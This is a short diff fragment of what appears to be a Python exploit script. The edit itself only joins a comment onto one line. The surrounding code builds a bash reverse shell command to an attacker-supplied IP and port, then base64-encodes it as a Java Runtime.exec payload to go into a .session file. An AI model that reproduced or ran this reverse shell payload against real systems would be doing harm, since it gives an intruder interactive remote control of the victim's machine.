@@ -119,8 +119,7 @@ body {
 	fname = get_random_string(6).capitalize()
 
 
-	# Create our .session file with JRE command from 
-	# http://jackson-t.ca/runtime-exec-payloads.html
+	# Create our .session file with JRE command from -- http://jackson-t.ca/runtime-exec-payloads.html
 	cmd = 'bash -i >& /dev/tcp/' + my_ip + '/' + my_port + ' 0>&1'
 	b = bytes(cmd, 'utf-8')
 	enc = base64.b64encode(b)
